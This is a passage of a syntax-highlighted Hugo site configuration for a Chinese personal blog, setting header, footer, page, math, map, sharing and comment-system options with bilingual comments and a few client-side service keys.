</span></span><span class="line"><span class="cl">  <span class="nx">images</span> <span class="p">=</span> <span class="p">[</span><span class="s2">&#34;/logo.png&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="c">#来自之前</span>
</span></span><span class="line"><span class="cl">  <span class="nx">archivePaginate</span> <span class="p">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># show &#39;xx Posts In Total&#39; in archive page ?            # 是否在归档页显示文章的总数</span>
</span></span><span class="line"><span class="cl">  <span class="nx">showArchiveCount</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Header config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 页面头部导航栏配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">header</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># desktop header mode (&#34;fixed&#34;, &#34;normal&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 桌面端导航栏模式 (&#34;fixed&#34;, &#34;normal&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">desktopMode</span> <span class="p">=</span> <span class="s2">&#34;fixed&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># mobile header mode (&#34;fixed&#34;, &#34;normal&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 移动端导航栏模式 (&#34;fixed&#34;, &#34;normal&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mobileMode</span> <span class="p">=</span> <span class="s2">&#34;auto&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Header title config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 页面头部导航栏标题配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">title</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># URL of the LOGO</span>
</span></span><span class="line"><span class="cl">      <span class="c"># LOGO 的 URL</span>
</span></span><span class="line"><span class="cl">      <span class="nx">logo</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># title name</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 标题名称</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;cnitlrtの博客&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># you can add extra information before the name (HTML format is supported), such as icons</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标</span>
</span></span><span class="line"><span class="cl">      <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&lt;i class=&#39;far fa-kiss-wink-heart fa-fw&#39;&gt;&lt;/i&gt;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># you can add extra information after the name (HTML format is supported), such as icons</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标</span>
</span></span><span class="line"><span class="cl">      <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to use typeit animation for title name</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否为标题显示打字机动画</span>
</span></span><span class="line"><span class="cl">      <span class="nx">typeit</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">busuanzi</span><span class="p">]</span>         <span class="c"># count web traffic by busuanzi                             # 是否使用不蒜子统计站点访问量</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">siteUV</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sitePV</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">pagePV</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">reward</span><span class="p">]</span>                                         <span class="c"># 文章打赏</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="nx">wechat</span> <span class="p">=</span> <span class="s2">&#34;/path/to/your/wechat-qr-code.png&#34;</span>           <span class="c"># 微信二维码</span>
</span></span><span class="line"><span class="cl">    <span class="nx">alipay</span> <span class="p">=</span> <span class="s2">&#34;/path/to/your/alipay-qr-code.png&#34;</span>    
</span></span><span class="line"><span class="cl">  <span class="c"># Footer config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 页面底部信息配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">footer</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Custom content (HTML format is supported)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 自定义内容 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">custom</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to show Hugo and theme info</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否显示 Hugo 和主题信息</span>
</span></span><span class="line"><span class="cl">    <span class="nx">hugo</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to show copyright info</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否显示版权信息</span>
</span></span><span class="line"><span class="cl">    <span class="nx">copyright</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to show the author</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否显示作者</span>
</span></span><span class="line"><span class="cl">    <span class="nx">author</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># site creation time</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 网站创立年份</span>
</span></span><span class="line"><span class="cl">    <span class="nx">since</span> <span class="p">=</span> <span class="mi">2021</span>
</span></span><span class="line"><span class="cl">    <span class="c"># ICP info only in China (HTML format is supported)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># ICP 备案信息，仅在中国使用 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">icp</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># license info (HTML format is supported)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 许可协议信息 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">license</span><span class="p">=</span> <span class="s1">&#39;&lt;a rel=&#34;license external nofollow noopener noreffer&#34; href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34;&gt;CC BY-NC 4.0&lt;/a&gt;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Section (all posts) page config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># Section (所有文章) 页面配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">section</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># special amount of posts in each section page</span>
</span></span><span class="line"><span class="cl">    <span class="c"># section 页面每页显示文章数量</span>
</span></span><span class="line"><span class="cl">    <span class="nx">paginate</span> <span class="p">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl">    <span class="c"># date format (month and day)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 日期格式 (月和日)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dateFormat</span> <span class="p">=</span> <span class="s2">&#34;01-02&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># amount of RSS pages</span>
</span></span><span class="line"><span class="cl">    <span class="c"># RSS 文章数目</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rss</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># List (category or tag) page config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># List (目录或标签) 页面配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">list</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># special amount of posts in each list page</span>
</span></span><span class="line"><span class="cl">    <span class="c"># list 页面每页显示文章数量</span>
</span></span><span class="line"><span class="cl">    <span class="nx">paginate</span> <span class="p">=</span> <span class="mi">20</span>
</span></span><span class="line"><span class="cl">    <span class="c"># date format (month and day)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 日期格式 (月和日)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dateFormat</span> <span class="p">=</span> <span class="s2">&#34;01-02&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># amount of RSS pages</span>
</span></span><span class="line"><span class="cl">    <span class="c"># RSS 文章数目</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rss</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c"># Page config</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 文章页面配置</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to hide a page from home page</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否在主页隐藏一篇文章</span>
</span></span><span class="line"><span class="cl">    <span class="nx">hiddenFromHomePage</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to hide a page from search results</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否在搜索结果中隐藏一篇文章</span>
</span></span><span class="line"><span class="cl">    <span class="nx">hiddenFromSearch</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to enable twemoji</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 twemoji</span>
</span></span><span class="line"><span class="cl">    <span class="nx">twemoji</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to enable lightgallery</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 lightgallery</span>
</span></span><span class="line"><span class="cl">    <span class="nx">lightgallery</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to enable the ruby extended syntax</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 ruby 扩展语法</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ruby</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to enable the fraction extended syntax</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 fraction 扩展语法</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fraction</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to enable the fontawesome extended syntax</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否使用 fontawesome 扩展语法</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fontawesome</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to show link to Raw Markdown content of the content</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否显示原始 Markdown 文档内容的链接</span>
</span></span><span class="line"><span class="cl">    <span class="nx">linkToMarkdown</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># whether to show the full text content in RSS</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否在 RSS 中显示全文内容</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rssFullText</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Table of the contents config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 目录配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">toc</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to enable the table of the contents</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否使用目录</span>
</span></span><span class="line"><span class="cl">      <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to keep the static table of the contents in front of the post</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否保持使用文章前面的静态目录</span>
</span></span><span class="line"><span class="cl">      <span class="nx">keepStatic</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to make the table of the contents in the sidebar automatically collapsed</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否使侧边目录自动折叠展开</span>
</span></span><span class="line"><span class="cl">      <span class="nx">auto</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Code config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 代码配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">code</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to show the copy button of the code block</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否显示代码块的复制按钮</span>
</span></span><span class="line"><span class="cl">      <span class="nx">copy</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># the maximum number of lines of displayed code by default</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 默认展开显示的代码行数</span>
</span></span><span class="line"><span class="cl">      <span class="nx">maxShownLines</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">    <span class="c"># KaTeX mathematical formulas config (KaTeX https://katex.org/)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># KaTeX 数学公式配置 (KaTeX https://katex.org/)</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">math</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># default block delimiter is $$ ... $$ and \\[ ... \\]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 默认块定界符是 $$ ... $$ 和 \\[ ... \\]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">blockLeftDelimiter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">blockRightDelimiter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># default inline delimiter is $ ... $ and \\( ... \\)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 默认行内定界符是 $ ... $ 和 \\( ... \\)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">inlineLeftDelimiter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">inlineRightDelimiter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># KaTeX extension copy_tex</span>
</span></span><span class="line"><span class="cl">      <span class="c"># KaTeX 插件 copy_tex</span>
</span></span><span class="line"><span class="cl">      <span class="nx">copyTex</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># KaTeX extension mhchem</span>
</span></span><span class="line"><span class="cl">      <span class="c"># KaTeX 插件 mhchem</span>
</span></span><span class="line"><span class="cl">      <span class="nx">mhchem</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Mapbox GL JS config (Mapbox GL JS https://docs.mapbox.com/mapbox-gl-js)</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Mapbox GL JS 配置 (Mapbox GL JS https://docs.mapbox.com/mapbox-gl-js)</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">mapbox</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># access token of Mapbox GL JS</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Mapbox GL JS 的 access token</span>
</span></span><span class="line"><span class="cl">      <span class="nx">accessToken</span> <span class="p">=</span> <span class="s2">&#34;pk.eyJ1IjoiZGlsbG9uenEiLCJhIjoiY2s2czd2M2x3MDA0NjNmcGxmcjVrZmc2cyJ9.aSjv2BNuZUfARvxRYjSVZQ&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># style for the light theme</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 浅色主题的地图样式</span>
</span></span><span class="line"><span class="cl">      <span class="nx">lightStyle</span> <span class="p">=</span> <span class="s2">&#34;mapbox://styles/mapbox/light-v10?optimize=true&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># style for the dark theme</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 深色主题的地图样式</span>
</span></span><span class="line"><span class="cl">      <span class="nx">darkStyle</span> <span class="p">=</span> <span class="s2">&#34;mapbox://styles/mapbox/dark-v10?optimize=true&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to add NavigationControl (https://docs.mapbox.com/mapbox-gl-js/api/#navigationcontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否添加 NavigationControl (https://docs.mapbox.com/mapbox-gl-js/api/#navigationcontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">navigation</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to add GeolocateControl (https://docs.mapbox.com/mapbox-gl-js/api/#geolocatecontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否添加 GeolocateControl (https://docs.mapbox.com/mapbox-gl-js/api/#geolocatecontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">geolocate</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to add ScaleControl (https://docs.mapbox.com/mapbox-gl-js/api/#scalecontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否添加 ScaleControl (https://docs.mapbox.com/mapbox-gl-js/api/#scalecontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">scale</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># whether to add FullscreenControl (https://docs.mapbox.com/mapbox-gl-js/api/#fullscreencontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 是否添加 FullscreenControl (https://docs.mapbox.com/mapbox-gl-js/api/#fullscreencontrol)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">fullscreen</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Social share links in post page</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 文章页面的分享信息设置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">share</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Twitter</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Facebook</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Linkedin</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Whatsapp</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Pinterest</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Tumblr</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">HackerNews</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Reddit</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">VK</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Buffer</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Xing</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Line</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Instapaper</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Pocket</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Digg</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Stumbleupon</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Flipboard</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Weibo</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Renren</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Myspace</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Blogger</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Baidu</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Odnoklassniki</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Evernote</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Skype</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Trello</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="nx">Mix</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="c"># Comment config</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 评论系统设置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Disqus comment config (https://disqus.com/)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Disqus 评论系统设置 (https://disqus.com/)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">disqus</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Disqus shortname to use Disqus in posts</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Disqus 的 shortname，用来在文章中启用 Disqus 评论系统</span>
</span></span><span class="line"><span class="cl">        <span class="nx">shortname</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Gitalk comment config (https://github.com/gitalk/gitalk)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Gitalk 评论系统设置 (https://github.com/gitalk/gitalk)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">gitalk</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">owner</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">repo</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clientId</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clientSecret</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Valine comment config (https://github.com/xCss/Valine)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Valine 评论系统设置 (https://github.com/xCss/Valine)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">valine</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">appId</span> <span class="p">=</span> <span class="s1">&#39;cIRpq8figzQxyGz5LyAdUahJ-gzGzoHsz&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">appKey</span> <span class="p">=</span> <span class="s1">&#39;T9YWfgGhznKaXXx7TCLxzS3C&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">notify</span> <span class="p">=</span> <span class="kc">true</span>  <span class="c"># mail notifier , https://github.com/xCss/Valine/wiki</span>
</span></span><span class="line"><span class="cl">        <span class="nx">verify</span> <span class="p">=</span> <span class="kc">false</span> <span class="c"># Verification code</span>
</span></span><span class="line"><span class="cl">        <span class="nx">avatar</span> <span class="p">=</span> <span class="s1">&#39;robohash&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">placeholder</span> <span class="p">=</span> <span class="s1">&#39;说点什么吧...&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">visitor</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">path</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">meta</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pageSize</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">lang</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enableQQ</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Facebook comment config (https://developers.facebook.com/docs/plugins/comments)</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Facebook 评论系统设置 (https://developers.facebook.com/docs/plugins/comments)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">facebook</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">width</span> <span class="p">=</span> <span class="s2">&#34;100%&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">numPosts</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nx">appId</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">languageCode</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Telegram comments config (https://comments.app/)</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Telegram comments 评论系统设置 (https://comments.app/)</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">params</span><span class="p">.</span><span class="nx">page</span><span class="p">.</span><span class="nx">comment</span><span class="p">.</span><span class="nx">telegram</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">siteID</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">limit</span> <span class="p">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="nx">height</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">color</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">colorful</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dislikes</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="nx">outlined</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="c"># Commento comment config (https://commento.io/)</span>
